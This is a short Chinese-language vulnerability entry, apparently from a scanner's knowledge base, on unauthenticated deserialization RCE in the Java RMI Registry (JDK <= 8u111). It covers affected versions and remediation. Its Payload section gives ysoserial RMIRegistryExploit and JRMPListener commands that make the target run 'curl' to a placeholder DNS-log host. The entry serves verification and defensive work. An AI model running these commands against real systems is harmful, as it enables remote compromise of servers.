---
id: JAVA-RMI-REGISTRY-BIND-DESERIALIZATION
title: Java RMI Registry 反序列化命令执行漏洞
product: java
vendor: Oracle
version_affected: "<=JDK 8u111"
severity: CRITICAL
tags: [rce, deserialization, rmi, 无需认证]
fingerprint: ["Java RMI", "RMI Registry"]
---

## 漏洞描述

Java RMI Registry 存在反序列化漏洞。攻击者可以在绑定过程中通过伪造序列化数据，使 Registry 对数据进行反序列化时触发攻击链（如 CommonsCollections）执行任意命令。

## 影响版本

- JDK <= 8u111

## 前置条件

- 无需认证
- 可访问 RMI Registry 端口（默认 1099）

## 利用步骤

1. 使用 ysoserial 生成恶意序列化 payload
2. 使用 ysoserial 的 RMIRegistryExploit 发起攻击

## Payload

```bash
# 使用 ysoserial 发起攻击
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <target_ip> 1099 CommonsCollections6 "curl your-dnslog-server"

# 或使用 JRMPListener
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections6 "curl your-dnslog-server"
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <target_ip> 1099 jrmphost 8888
```

## 验证方法

```bash
# 检查命令是否在目标执行
curl http://target:1099  # 会返回错误但命令可能已执行
```

## 修复建议

1. 升级 JDK 至 8u121+
2. 启用 RMI Registry 的白名单机制
3. 升级 commons-collections 版本
